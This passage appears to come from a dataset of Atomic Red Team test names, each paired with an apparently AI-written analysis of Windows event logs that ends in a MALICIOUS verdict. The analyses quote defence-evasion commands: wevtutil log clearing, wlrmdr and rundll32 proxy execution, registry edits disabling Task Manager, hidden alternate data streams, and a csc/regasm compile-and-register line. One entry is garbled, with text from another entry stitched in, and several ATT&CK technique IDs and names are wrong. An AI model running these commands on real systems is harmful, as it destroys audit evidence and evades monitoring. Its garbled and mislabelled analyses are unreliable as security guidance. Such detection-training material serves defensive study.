- **Assessment**: Executing scripts from remote URLs, particularly those related to potentially malicious tools or techniques (like those from the Atomic Red Team, which is often used for attack simulations and testing), is suspicious. It indicates potential misuse or intended testing of security mechanisms that weren't documented.

#### 2. **System Log Review**:
- **Observed Activity**: System and PowerShell logs were cleared by the user `admin_test` as indicated by Event IDs 104.
- **Assessment**: Clearing logs is usually a significant indicator of malicious intent as attackers might clear logs to remove traces of their activities. This behavior is especially concerning if combined with other suspicious activities observed.

#### 3. **Security Log Review**:
- **Observed Activity**: The security log has also been cleared (Event ID 1102) by the same user (`admin_test`). 
- **Assessment**: Similar to the system log, clearing of security logs is indicative of an attempt to hide malicious activities. This action needs immediate attention.

#### 4. **Sysmon Log Review**:
- **Observed Activity**: Multiple uses of `wevtutil.exe` to clear logs on the system (`""C:\\Windows\\system32\\wevtutil.exe"" cl Application/ System/ Security/ ""Windows PowerShell""`). The user involved is `admin_test`.
- **Assessment**: The use of `wevtutil.exe` to clear logs is another clear sign of malicious activity, especially when executed by a regular user account without proper justification or documentation of maintenance activities. The execution of legitimate tools for potentially illegitimate purposes is a red flag.
- Additionally, a suspicious PowerShell command is being executed as shown by the Sysmon logs.

#### 5. **Application Log Review**:
- **Observed Activity**: No significant anomalous activity in context to other findings.
  
### Overall Assessment
The combination of executing a potentially harmful script from a remote source and the subsequent clearing of logs by `admin_test` indicates strong evidence of a potential compromise on the system.

### Final Resolution: **MALICIOUS**
The activities observed in the logs represent clear indicators of compromise:

1. **Execution & Download from Remote Location**: The PowerShell script fetched from a known adversary simulation tool repository (Atomic Red Team) hints at adversarial testing or abuse.
2. **Log Clearing Activities**: The clearing of multiple logs (System, PowerShell, and Security) using a built-in tool (`wevtutil`) by `admin_test` demonstrates an attempt to conceal evidence of activity, strongly suggesting malicious intent.

### Guidance on How to Proceed:
1. **Immediate Isolation**: Isolate the affected system from the network to prevent further potential malicious activities.
2. **Investigative Actions**:
   - Conduct a full forensic investigation on the host.
   - Analyze network traffic around the timestamps of these events for other signs of infection or exfiltration.
   - Review other systems for similar activities or accounts for signs of lateral movement or compromise.
3. **Incident Response**:
   - If intention was benign (testing), verify with responsible personnel and ensure future activities are documented.
   - Reset or review access permissions and policies for the user `admin_test`.
4. **Remediation Steps**: Ensure all used tactics are addressed by updating policies, disabling unnecessary services, and deploying updated security controls.
5. **Communication**: Report findings to the incident response team and management for awareness and further steps.

Given the severity of the identified behavior, a comprehensive response plan should be swiftly deployed to contain and remediate the threat."
Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler,"### Detailed Analysis:

#### Indicators of Potential Malicious Activity:

1. **PowerShell Execution:**
   - The execution of `powershell.exe` with the command line: `Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\\system32\\rundll32.exe` is suspicious and potentially malicious. Such command lines often indicate scripting activities that can be used to evade detection and execute malicious payloads.

2. **Log Clearing:**
   - The logs show multiple instances of the clearing of event logs:
     - **System Log Cleared:** `EventID 104` under the System channel.
     - **Windows PowerShell Log Cleared:** `EventID 104` under the Windows PowerShell channel.
     - **Security Log Cleared:** `EventID 1102` indicates the ""Security"" log is cleared.
   - Log clearance is a common tactic used by attackers to hide their tracks after performing malicious activities.

3. **High Integrity Level Execution:**
   - The process executions and commands were executed with high integrity levels, indicating elevated privileges, which could have allowed unauthorized actions or access.

4. **Unusual Process Execution:**
   - Numerous events show the execution of `wevtutil.exe` (commonly used for managing event logs) followed by the clearing of logs, which aligns with behavior to obscure footprints.

#### Assessment:

Based on the observed activities, specifically the suspicious PowerShell command execution, and the multiple instances of event log clearances, it can be assessed that the logs contain indications of potential malicious activity. The use of PowerShell in such a manner and the consistent clearing of event logs are red flags.

#### Conclusion:
- **Resolution: MALICIOUS**
  
Immediate action is recommended to investigate the nature of the PowerShell scripts and perform a forensic analysis to identify potential modifications or unauthorized access. The system should be isolated to prevent further compromise, and historical data or backups should be checked to restore untampered event logs if possible. Implement additional monitoring and protection for PowerShell and logging features to prevent a recurrence.
"
Disable Event Logging with wevtutil,"### Detailed Analysis

**Security Logs:**
- **Event ID 1102 (Log File Cleared):** A security log clear event was recorded. An admin-level user ('admin_test') cleared the security logs, which is a potential indicator of log tampering often associated with malicious activity trying to cover its tracks. The process ID used for the action (4436) corresponds to `wevtutil.exe`, a command-line utility for managing event logs.
  
- **Event ID 4616 (System Time Changed):** Multiple instances show that system time was set back by a few seconds. Although this could be legitimate system activity, changes to the system time can be a tactic used to disrupt log file accuracy or bypass time-based security measures.

- **Event ID 4624 and 4634 (Logon and Logoff Events):** The user 'admin_test' is logged on twice with logon type 3 (network), which may indicate remote access. The use of NTLM for authentication and the presence of elevated privileges (Event ID 4672) indicates the user had extensive system rights during the sessions.

**System Logs:**
- **Event ID 104 (Log File Cleared):** The system and Windows PowerShell event logs were also cleared by the 'admin_test' account, reflecting potential malicious intentions, consistent with efforts to hide tracks or system changes.

**Sysmon Logs:**
- **Frequent use of `wevtutil.exe`:** The `wevtutil.exe` utility, responsible for clearing event logs, is repeatedly executed by 'admin_test'. While it can be legitimate, the actions taken here (clearing various logs) strongly correlate with attempts of evidence removal.

- **Use of `Hostname.exe` and `whoami.exe`:** Operations like executing `hostname.exe` and `whoami.exe` are typical for attackers to gather local user and system information once a breach has been established.

- **Command Usage via `cmd.exe`:** A specific command was executed to disable the event logging for `Microsoft-Windows-IKE/Operational`, which suggests an attempt to avoid detection and monitoring.

### Assessment

The combination of the log clearing events (both security and system logs), the suspicious time adjustments, the privilege elevation activity, and the disabling of specific log sources establish a pattern of suspicious and possibly malicious behavior. These actions align closely with techniques used by attackers to conduct initial reconnaissance, establish persistence, and cover their tracks after gaining unauthorized access.

### Resolution

**MALICIOUS**

### Guidance on How to Proceed
- **Immediate Action:** 
  - Isolate the affected host (Server002) from the network to prevent further potential compromise or data exfiltration.
  
- **Further Investigation:** 
  - Conduct a thorough forensic analysis of the system to identify potential malware or backdoor installations.
  - Check for any unauthorized changes made to system configurations or the presence of any additional compromised accounts.

- **Review Network Traffic:** 
  - Analyze network logs for unusual outbound connections that may suggest data exfiltration attempts.

- **Audit Other Systems:** 
  - Check similar logs and activities on other critical systems to ensure the breach is contained.

- **Adoption of Security Measures:** 
  - Strengthen logging and monitoring policies, ensuring access to such capabilities is closely controlled and monitored.
  - Implement better network segmentation and employ multi-factor authentication (MFA) to prevent unauthorized access."
System Binary Proxy Execution - Wlrmdr Lolbin,"The provided Windows event logs reveal several entries that merit attention due to potential security concerns.

### Suspicious Activity Observed:

1. **Log Clearing Events**: 
   - Multiple occurrences of Windows Event Logs being cleared are logged (EventID 104 in the System log and EventID 1102 in the Security log). This could be a tactic to hide traces of malicious activity, as clearing event logs is a common characteristic of adversarial behavior to detract an investigator or conceal unauthorized actions.

2. **Suspicious PowerShell Usage**:
   - A command was executed via PowerShell using `wlrmdr.exe`, which in itself is not standard or commonly observed in typical operations. The command line given is:
     ```
     powershell.exe & {wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u ""C:\Windows\System32\calc.exe""}
     ```
   - This execution is suspicious as PowerShell is commonly used in script-based attacks. The command seems to be executing or scheduling the 'calc.exe' application, which under typical operations would not involve such intricate command structures unless meant to mask other underlying tasks.

3. **Multiple Usage of `wevtutil.exe`**:
   - `wevtutil.exe` was used several times to explicitly clear event logs such as System, Application, and Security logs. The use of `wevtutil.exe` for log clearing instead of regular maintenance activities is a red flag for potentially malicious activities.

### Assessment:

Given the observed behaviors in the logs:

- **Privilege Escalation Indicators**: The user `admin_test` has been associated with multiple high-integrity level process executions and event log clearances. Several processes started with high privileges including specific access privileges (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege) indicative of possible privilege escalation attempts.
  
- **Unusual Command-Line Arguments and Utilities**: The combination of the PowerShell script usage and execution of `wlrmdr.exe` indicates a deeper scrutiny into what `wlrmdr.exe` is required, as it does not seem to be a recognized standard utility for Windows operations. 

- **Log Manipulation**: Intentional clearing of the logs suggests an attempt to obfuscate activities or clean up traces of previous actions which align with malicious intent.

Based on the analysis of these logs, indicators such as log clearing, use of atypical executables and command lines, and privilege activities are suggestive of targeted malicious activities rather than benign operation interventions.

### Conclusion:

**Resolution: MALICIOUS**

The activity observed within these logs strongly suggests malicious activity. Immediate actions should involve isolating the affected systems, conducting a thorough malware scan, and investigating processes and files related to the user `admin_test` to further assess and remediate the potential security breach."
Windows - Modify file last modified timestamp with PowerShell,"Based on the analysis of the provided Windows event logs, several indicators of suspicious behavior suggest potential malicious activity.

### Suspicious or Anomalous Behavior:
1. **PowerShell Command Executions:**
   - The PowerShell logs indicate the execution of a script using `powershell.exe` with the command-line argument that modifies the `LastWriteTime` of a file (T1551.006_timestomp.txt) to ""01/01/1970 00:00:00"". This behavior is indicative of timestomping, a technique attackers use to manipulate file timestamps to evade detection.
   - The command is executed by the user `SERVER002\admin_test`, suggesting this user might be involved in or subject to malicious activity.

2. **Event Log Clearing:**
   - There are several instances of system, Windows PowerShell, and security event logs being cleared (EventID 104 in the System log and EventID 1102 in the Security log). This behavior is often an attempt to delete traces of activity from system logs, commonly associated with malicious activity.

3. **Sysmon Logs:**
   - Multiple processes involving `wevtutil.exe` are observed, correlated with clearing event logs (e.g., ""cl Application"", ""cl System"", ""cl Security"", and ""cl Windows PowerShell""), all executed by the same user `SERVER002\admin_test`.

4. **Unauthorized Use of System Utilities:**
   - The `whoami.exe` and `hostname.exe` system utilities were executed under the `admin_test` user. While their presence isn't inherently malicious, in combination with the above findings, it might suggest reconnaissance activity.

5. **High Integrity Level Processes:**
   - Many of the processes executed (e.g., `powershell.exe`, `wevtutil.exe`) are run at a high integrity level. This is required for certain administrative actions, such as clearing logs, which aligns with the suspicious activity.

### Assessment:
- **Indicators of Malicious Activity:**
  - The combination of modifying file timestamps and clearing multiple event logs under a high privilege account strongly indicates actions designed to cover tracks.
  - The use of known administrative utilities to clear logs and alter file metadata without a known legitimate purpose or context is highly suspicious.
  
### Threats or Risks Identified:
- The activity suggests a high likelihood of malicious actions aimed at evasion and persistence.
- The use of the `admin_test` account for these actions poses a risk of either a compromised account or a malicious insider.

### Recommendations to Proceed:
1. **Immediate Investigation:**
   - Investigate the account `SERVER002\admin_test` for compromise or misuse.
   - Verify the legitimacy of any scripts or scheduled tasks that involve `powershell.exe`.

2. **Access Controls:**
   - Review and tighten permissions on high-privilege accounts and processes.
   - Implement monitoring for unusual administrative activities.

3. **Incident Response:**
   - Preserve current system logs and any available forensic evidence.
   - Assess whether other hosts in the network exhibit similar behavior patterns.

4. **Enhanced Monitoring:**
   - Enable auditing and higher verbosity of PowerShell logging.
   - Set alerts for log-clearing events and unauthorized use of system utilities.

**Resolution:** **MALICIOUS**

The activities recorded in the logs contain strong indicators of malicious actions, including persistence techniques and log evasion, necessitating immediate response and remediation actions."
WMIC bypass using remote XSL file,"After analyzing the provided Windows event logs, I have observed some potentially suspicious activities that warrant further investigation:

1. **Sysmon Log Events:**
   - Multiple executions of `wevtutil.exe` within a short timeframe suggest an attempt to clear or fetch event logs. `wevtutil.exe` is a legitimate tool for managing event logs, but frequent use in a short period can be suspicious.
   - The command line execution for `cmd.exe` involves downloading a script from a remote URL using `wmic`. This behavior is typical in attempts to execute remote scripts maliciously.
   - The presence of high-integrity processes like `cmd.exe` and associated console host (conhost.exe) commands indicates high privileges, which is common in attempts to execute sensitive commands.

2. **System Log Events:**
   - The system log shows events indicating that logs have been cleared by user `admin_test`. Event ID 104 in the System log suggests that clearing events occurs, which can be used to hide malicious activities.

3. **Security Log Events:**
   - Event ID 1102, which signifies the clearing of the security log, has been triggered, involving user `admin_test`. This action is highly suspect, especially when seen alongside other unusual activities and attempts to conceal actions.

4. **General Observations:**
   - The frequent clearing of event logs (system, Windows PowerShell, and security) is a significant indicator of malicious activity as it’s often used to cover tracks.
   - The involvement of administrative privileges in executing these tasks suggests a compromised or maliciously used account.

Given the outlined observations, this activity indicates a potentially compromised system or malicious insider attempts to obfuscate actions by clearing logs and attempting external command execution. Therefore, I classify these findings as:

- **Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the involved host (`Server002`) from the network to prevent any further unauthorized activity.
- Conduct a comprehensive investigation into the `admin_test` account, including reviewing authentication sources and any anomaly in its use.
- Retain all log files for forensic analysis, possibly engaging a digital forensics team to recover cleared data.
- Review and increase monitoring capabilities for processes like `wevtutil.exe`, `cmd.exe`, and `wmic.exe` tied to unauthorized external access.
- Consider employing endpoint detection and response tools to identify and mitigate further suspicious activities across the infrastructure.
- Ensure regular backups and conduct security awareness training, emphasizing log management and suspicious activity reporting for users with administrative privileges."
DisallowRun Execution Of Certain Applications,"Based on the analysis of the provided logs, there are several noteworthy observations.

### Suspicious Activities:

1. **Clearing of Event Logs:**
   - Multiple logs, including the System, Windows PowerShell, and Security event logs, were cleared by the user ""SERVER002\\admin_test"" around the same time window. For example, the `wevtutil` utility was used to clear:
     - `System` log (ProcessId 408)
     - `Application` log (ProcessId 408)
     - `Security` log (ProcessId 1360)
   - The clearing of event logs is typically performed to cover tracks and is a strong indicator of malicious behavior, especially if it occurs without an authorized reason.

2. **Registry Modifications:**
   - The sequence of commands run through `cmd.exe` included restrictive policies such as:
     - Adding entries to the `DisallowRun` registry key, effectively blocking applications like `regedit.exe` and `cmd.exe`, which could suggest an attempt to hinder further digital forensic investigations.
   
3. **High Integrity Level:**
   - The processes, including `cmd.exe`, `wevtutil`, and `reg.exe`, are being executed with ""High"" integrity. While not inherently malicious, combined with other activities, it suggests privileged actions were taken that could lead to a system compromise.

4. **Chain of Processes:**
   - The parent processes for these logs are `wsmprovhost.exe`, which can be used for remote management. While legitimate, it highlights possible remote administrative actions that should be scrutinized, given the resulting event log activities.

### Malicious Likelihood:

Given the combination of actions — particularly the clearing of logs, modification of registry settings to prevent certain applications from running, and execution of high-privilege processes — there are strong indicators of malicious activity. 

The use of `cmd.exe` through spawned processes to make registry changes in user policy is especially concerning and likely indicates unauthorized configuration changes.

### Guidance:

- **Containment and Remediation:**
  - Immediate containment is recommended. Investigate if further monitoring or isolation of the affected machine (Server002) is possible to prevent further unauthorized actions.
  - Conduct a full security review and malware scan on the system to check for persistence mechanisms or further compromises.
  
- **Investigation Expansion:**
  - Validate and audit the actions of the user `SERVER002\\admin_test` to determine intention and if their credentials were compromised. 

- **Logging and Monitoring:**
  - Enhance the monitoring and alerting specifically for event log clearing and registry modifications for similar incidents in other environments.
  - Ensure all proper security measures and endpoint detection technologies are configured to detect and prevent these actions in the future.

Final Resolution: **MALICIOUS** - The logs contain evidence and patterns of actions resembling an illicit and potentially harmful operation on the system."
Mimic Ransomware - Enable Multiple User Sessions,"Upon reviewing the provided Windows event logs, several activities suggest a potential security incident. Here's the detailed analysis:

### Analysis of Logs:

#### Sysmon Log Analysis:
1. **Use of `wevtutil.exe`**:
   - There are multiple entries for the `wevtutil.exe` process with command lines indicating the clearing of Windows event logs (`wevtutil cl` for channels like Microsoft-Windows-Sysmon/Operational, Security, System, Windows PowerShell, etc.). This behavior is highly suspicious as it is often associated with attempts to cover tracks on a compromised system.
  
2. **Creation of Suspicious Registry Key**:
   - A `cmd.exe` process executed a command to modify the Windows Registry (`reg.exe`), specifically adding/modifying the `AllowMultipleTSSessions` setting. This action may indicate an attempt to persist remote desktop sessions or alter remote access settings, which is common in malicious activities.

3. **Execution of `hostname.exe` and `whoami.exe`**:
   - These commands are typically used in reconnaissance to gather information about the system environment. When coupled with other suspicious behaviors, they could indicate malicious intent.

4. **Abnormal Parent-Child Relationships**:
   - Processes like `wevtutil.exe` and `cmd.exe` showing `wsmprovhost.exe` (Windows Remote Management service) as a parent process are unusual unless system management tasks are being performed deliberately.

#### Security Log Analysis:
1. **Log Clearing Events**:
   - The Security log contains Event ID 1102 which indicates that the security log was cleared by the user `admin_test`. This action is noteworthy because attackers often clear event logs to erase traces of their presence or activities.

#### System Log Analysis:
1. **Log Clearing Events**:
   - Similar to the security log, both System and Application logs show evidence of being cleared, which aligns with the suspicious behavior of covering tracks by a potential attacker.

### Threat Assessment:
- The combination of cleared event logs, registry modifications, and command executions suggests orchestrated behavior that aligns more with malicious activity.

### Risk and Threats Identified:
- The actions noted are consistent with techniques used by attackers to gain and maintain unauthorized access, conduct reconnaissance within the system, and cover their tracks.

### Resolution:
- **MALICIOUS**: The activities logged exhibit clear signs of malicious intent, including event log clearing, registry modifications for remote access, and suspicious system queries potentially tied to reconnaissance.

### Guidance on How to Proceed:
1. **Immediate Isolation**: Isolate the affected host (`Server002`) from the network to prevent any further potential malicious activities.
  
2. **Detailed Forensics**: Conduct a detailed forensic analysis to identify further indicators of compromise, retrieve cleared log information if possible, and understand the full scope of access.
  
3. **User Review**: Review user account `admin_test` for legitimacy and any signs of compromise.
  
4. **Security Audit**: Perform audits of other systems for similar indicators of compromise.
  
5. **System Restoration**: Consider restoring the system from a known clean backup after ensuring the root cause is identified and mitigated.

6. **Incident Report**: Document the findings and prepare an incident report for escalation to higher management and legal authorities if necessary."
Rundll32 ieadvpack.dll Execution,"Upon reviewing the provided Windows event logs, I have identified several points of interest that warrant a deeper analysis:

1. **Log Clearing Activities**:
   - The logs indicate that the system log, Windows PowerShell log, and security log were cleared by the user ""admin_test"" on `Server002`. The event IDs related to log clearing activities are:
     - System log cleared (Event ID 104),
     - Windows PowerShell log cleared (Event ID 104),
     - Security log cleared (Event ID 1102).
   - Log clearing is typically considered suspicious, especially if it occurs unexpectedly or without a documented reason, as it may be an attempt to cover malicious activities.

2. **Unusual Command Execution**:
   - A `cmd.exe` process was initiated with the command line involving `rundll32.exe` for launching sections from a file path associated with `AtomicRedTeam`. This is commonly used for exploitation techniques and may suggest that an execution attempt of a potentially malicious or test payload occurred.
   - Further investigation is necessary to determine if this was part of legitimate testing or unauthorized activity.

3. **Use of `wevtutil.exe`**:
   - The utility `wevtutil.exe` was frequently launched with the `cl` (clear log) command targeting multiple system logs. This behavior, coupled with the log clearing events, suggests a deliberate effort to erase traces of activity.

4. **Process Execution**:
   - While most process executions appear standard for a Windows system, the context of their execution (especially in conjunction with log clearing) raises suspicions. The repeated sequence of processes relating to `wevtutil.exe` and the `cmd.exe` with `rundll32.exe` requires verification of their intended purpose.

Based on the points raised, the series of actions and the context in which they occurred are indicative of potentially unauthorized or malicious activities, specifically aimed at log tampering and concealing actions on the system.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediately review user access logs to identify how and when ""admin_test"" accessed the system, as well as check for any unauthorized changes to user permissions or creation of new accounts around this timeframe.
- Thoroughly investigate and verify if `AtomicRedTeam` activities were sanctioned. The presence of such files might relate to security testing exercises, but if unauthorized, it could imply a security breach.
- Analyze network traffic for any anomalies around the timeframe of these logs, as malicious actors might exfiltrate data following such activities.
- Suspend and audit the account `admin_test` until a complete incident response is conducted.
- Enhance monitoring and alerting on unexpected log clearing activities and the execution of command-line utilities known for log manipulation."
Create Hidden Directory via $index_allocation,"Based on the provided log entries, let's analyze the potentially suspicious or malicious activity:

1. **Event Log Clearing:**
   - There are multiple entries indicating that logs have been cleared:
     - Security Event ID 1102 logs that the security log was cleared by the user ""admin_test"". 
     - System Event ID 104 logs that the System, Windows PowerShell, and Security channels have been cleared by the same user.
   - The clearing of logs is often used to hide malicious activity, as it erases audit trails.

2. **Command Execution Using `wevtutil.exe`:**
   - There are multiple instances of `wevtutil.exe` processes being executed with the argument to clear event logs (such as ""wevtutil.exe cl Security"").
   - This reinforces the suspicion of deliberate log clearing.

3. **Unusual Command Execution via `cmd.exe`:**
   - A command was executed to create and write to a hidden NTFS alternate data stream using `cmd.exe` with the command: `""cmd.exe"" /c md %temp%\\...$.......::$index_allocation & echo too many secrets > %temp%\\...$.......::$index_allocation\\secrets.txt`.
   - Using alternate data streams (ADS) is a technique often used to hide data or malicious files without creating additional files in the file system.
   - The specific pattern and content suggest intentional data hiding.

Given these observations:
- Multiple log-clearing events correspond with `wevtutil.exe` commands, which attempt to obscure other activities on the machine.
- The creation of hidden data streams suggests a step in an advanced attack, such as data exfiltration or persistence.

Considering these points, this activity is highly indicative of malicious intent, particularly because of the combination of log clearance, use of powerful system utilities, and obscure data storage methods.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected system from the network to prevent further propagation or data exfiltration.
- Conduct a thorough forensic investigation to uncover the full scope and impact of the activity, using backups to compare and recover erased logs if possible.
- Review user account activity, especially for ""admin_test"", to understand if this account was compromised.
- Enhance monitoring on similar systems to identify any correlated activity and contain further risks.
- Consider resetting credentials and improving logging policies to prevent future log-clearance activities."
Hide Windows Clock Group Policy Feature,"Upon reviewing the provided Windows event logs, several indicators suggest potentially malicious activity, necessitating a deeper investigation. Here's the analysis broken down:

1. **Event Log Clearing**: 
    - **Security EventID 1102** indicates that the audit log was cleared by the user ""admin_test"". This is a rare and significant red flag as it is often an attempt by an attacker to cover their tracks. Event log clearing should be treated as highly suspicious unless a valid administrative task was scheduled.

2. **Sysmon Log Events**:
    - Multiple instances of ""wevtutil.exe"" commands such as `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl Application`, `wevtutil.exe cl System`, and `wevtutil.exe cl Security` indicate a comprehensive clearing of logs. The use of ""wevtutil.exe"" for clearing event logs aligns with typical adversarial behavior for maintaining persistence or obfuscation.

3. **Registry Modification**:
    - A command executed through `cmd.exe` modifying the registry key to hide the clock (`reg add ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"" /v HideClock /t REG_DWORD /d 1 /f`) suggests unauthorized system changes that can be signs of system personalization by an attacker to blend in or even to prepare for further malicious activities.

4. **Use of System Utilities**:
    - The execution of utilities like `conhost.exe`, `wevtutil.exe`, `cmd.exe`, `reg.exe`, `hostname.exe`, and `whoami.exe` in a sequence, especially with elevated privileges (`High` integrity level), indicates enumeration and potential system manipulation. While these can be legitimate in certain contexts, in conjunction with other observed activities, they contribute to the suspicion.

5. **Edge Update Utility Execution**:
    - Multiple instances of `MicrosoftEdgeUpdate.exe` indicate potential legitimate update activities during the analyzed time frame. However, they occurred simultaneously with suspicious activities, warranting confirmation of authenticity.

6. **System Log Clearing**:
    - **System EventID 104** logs show systemic clearing by the same user that cleared security logs, ""admin_test"". Consistent activity across multiple log channels further solidifies the potential for malicious intent.

7. **Observations**:
    - No evidence was found explaining the necessity of these actions under a legitimate operational scenario. The high frequency and nature of the log advisory actions suggest an attempt to cover up actions or obscure a sequence of activity.

Based on the analysis presented above, the findings in the logs lean heavily towards malicious activity. Specifically, the clearing of logs by a single user within a short timeframe, combined with the registry modification command execution pattern, suggests intentional obfuscation by an unauthorized or malicious user. As a result, the resolution is:

**Resolution: MALICIOUS**

**Recommended Actions:**
- Initiate a comprehensive endpoint investigation to ascertain the current state of the system's integrity.
- Evaluate the account ""admin_test"" to verify legitimacy and ensure its security.
- Restore the cleared log files from backups if possible to understand previous activities.
- Conduct network monitoring to detect any further potential exfiltration or lateral movement.
- Review adjacent systems and settings to ensure no further breach has occurred.
- Strengthen audit and monitoring measures to prevent similar incidents."
WMI Win32_Product Class - Execute Local MSI file with an embedded DLL,"Based on the provided event logs, several indicators suggest potentially suspicious or malicious activity on the Windows host ""Server002"". Here is the detailed analysis:

### Suspicious and Anomalous Behaviors Identified:

   - The logs show the installation of an MSI package related to ""Atomic Red Team"" (ART). Atomic Red Team is typically used for simulating adversary tactics and techniques for security testing and monitoring. However, the activity could be benign if performed by authorized personnel for legitimate testing purposes.
   - Logs indicate the execution of a PowerShell command to install an MSI package located in a temporary directory (T1218.007_DLL.msi). The use of Invoke-CimMethod with PowerShell for installation is indicative of T1218.007 technique (Trusted Developer Utilities Proxy Execution), which could be used for hiding malicious activities.

2. **Event Log Clearing:**
   - Multiple entries show the use of `wevtutil.exe` to clear the event logs (Sysmon, Application, and Windows PowerShell). This is a typical tactic used by adversaries to hide tracks after compromising a system.
   - Event ID 1102 in the Security log indicates that security logs were cleared, which is a critical indicator of malicious activity. Clearing event logs is a known step taken by attackers to remove traces of malicious actions.

3. **PowerShell Execution:**
   - The PowerShell log indicates the use of PowerShell with `-nop` (no profile) and `-Command` flags to execute scripts. The presence of a command writing custom actions could signify script execution with potentially malicious intent, especially without user oversight.

4. **Use of Sysmon for Detection Evasion:**
   - Sysmon logs also captured activities of event log clearing, which is indicative when adversaries aim to avoid detection.
   - The integrity level of the processes executing these commands is marked as High; this suggests that operations are performed with significant privileges.

5. **User Identified in Cleared Logs:**
   - Log entries indicate that actions were performed by ""admin_test"" user. Mapping such actions to a known administrative account used for log tampering raises concerns about credential misuse or compromise.

### Conclusion:

- **Resolution:** **MALICIOUS**

The event logs clearly depict indicators of malicious activity:
- The clearance of several critical event logs (Application, Sysmon, Windows PowerShell, and Security) suggests an attempt to cover tracks.
- Execution of scripts and installation actions via PowerShell using Atomic Red Team simulative techniques, without clear indication of authorized control or purpose, is highly suspicious.
- The combination of these actions, especially the event log clearance, is a strong indicator of intrusion with potential intent to hide malicious actions.

   - The `Sysmon log` entries reveal the execution of potentially malicious PowerShell and command-line activities. 
   - The key suspicious command involves a process using the command line `""cmd.exe"" /c C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\""%%tmp%%\\T1218.009.dll\"" /target:library \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.009\\src\\T1218.009.cs\"" & C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U %%tmp%%\\T1218.009.dll""`.
   - This command appears to be consistent with techniques found in the MITRE ATT&CK framework, specifically ""T1218.009: Component Object Model and Registration spoofing,"" which might be utilized for persistence or privilege escalation by malicious actors.

3. **Behavior of Microsoft EdgeUpdate:**
   - Frequent updates and restarts of `MicrosoftEdgeUpdate.exe` are noted. While this could be legitimate, the timing and frequency might warrant further investigation to rule out misuse or exploitation by malicious software.

4. **High Integrity and SYSTEM Level Processes:**
   - Many of these potentially suspicious processes were run with high integrity levels and as `NT AUTHORITY\SYSTEM`. Running processes with such privileges is unconventional for normal applications unless during system updates or specific administrative tasks.

**Assessment:**
- Based on the evidence of log clearance, suspicious command executions, elevated privileges, and the potential use of legitimate applications for illegitimate purposes, these activities strongly suggest an attempted cover-up or execution of malicious actions on `Server002`.

**Threats and Risks Identified:**
- Potentially compromised `admin_test` account for log clearance and malicious activities.
- Unauthorized execution of high-integrity processes that could escalate permissions or maintain persistence.
- Possible tampering with system components, potentially indicative of a sophisticated attack maneuver.

**Guidance on How to Proceed:**
- Immediately conduct a deeper forensic investigation into the `admin_test` user account activities.
- Review and analyze file integrity and process activity, especially the execution of PowerShell and command-line operations.
- Deploy endpoint detection and response (EDR) tools to monitor anomalous behavior in real-time.
- Verify the integrity and ensure the security of all systems, focusing on reinstating defenses and patching any vulnerabilities discovered.

**Resolution: MALICIOUS**
- Given the log-clearing behavior combined with suspicious execution traces, there is conclusive evidence indicating malicious activity. Immediate actions should be taken to contain and remediate the threat."
Disable Windows Task Manager application,"### Detailed Analysis

1. **Log File Clearing and Time Manipulation:**
   - **Security Log Event 1102** and **System Log Event 104** indicate log file clearance by the user ""admin_test"".
   - **Event ID 4616** in the Security log shows a time change where the ""NewTime"" is set to an earlier time than ""OldTime"", a timestamp manipulation often indicative of evading detection mechanisms.

2. **Process Execution and Command-Line Activities:**
   - **Sysmon Events for `wevtutil.exe`:** Numerous instances where `wevtutil.exe` is executed to clear logs across various channels (Sysmon, Application, System, Security, Windows PowerShell). This command-line utility's frequent use in conjunction with log clearance is highly suspicious and suggests efforts to hide malicious activity.
   - **Cmd.exe Activity:** An instance of `cmd.exe` executing a command to alter registry keys to disable the Task Manager (Sysmon Event 17978). This activity is common in scenarios where attackers try to prevent task manager access to hinder investigation or stop processes users may notice.

3. **Privilege Escalation and Misuse:**
   - **High Integrity Levels:** Many processes (e.g., `wevtutil.exe`, `cmd.exe`) show a High integrity level executed by ""SERVER002\admin_test"", potentially revealing the misuse of administrator privileges.

4. **Unusual Software and Processes:**
   - **Edge Update Activity:** Numerous Edge update-related activities are observed in the logs. While these may be common, their excessive appearance as process starts and service stops within a tight timeframe amid other suspicious activities might merit a closer look. However, no clear malicious indicator from these alone.

### Assessment and Resolution:

Upon reviewing the evidence, there's a clear attempt to cover tracks through timestamp manipulation and log clearing, alongside suspicious cmd.exe usage to modify registry settings. This behavior aligns with aggressive post-exploitation efforts to maintain persistence or escalate privileges quietly.

**Resolution:** MALICIOUS

### Recommendations:

1. **Immediate Isolation:** Isolate the involved machine, Server002, from the network to prevent any further potential spread or data exfiltration.
2. **Forensics Analysis:** Conduct a thorough forensic analysis to identify possible malware, rootkits, or unauthorized accounts.
3. **Audit User Actions:** Verify user activities, especially for ""admin_test"", and ensure this account is not compromised.
4. **Review Security Practices:** Reinforce log monitoring mechanisms and consider deploying EDR solutions that can alert on suspicious activities like log clearing and time anomalies.
5. **Increase Vigilance on Privilege Use:** Regularly review access logs and implement stricter controls on accounts with high privileges."
Do Not Connect To Win Update,"Based on the provided Windows event log entries, I have conducted a detailed analysis focusing on identifying any indicators of malicious activity or compromise. Here are the key findings:

1. **Log Clearing Events**:
   - Multiple event logs have been cleared, which is indicated by the presence of Event ID 104 in the System log and Event ID 1102 in the Security log. These events show that the logs for the ""System"", ""Windows PowerShell"", and ""Security"" channels have been cleared by a user named ""admin_test"". Log clearing is often performed to cover tracks and hide malicious activities. This suggests a potential security incident.

2. **Suspicious Command Execution**:
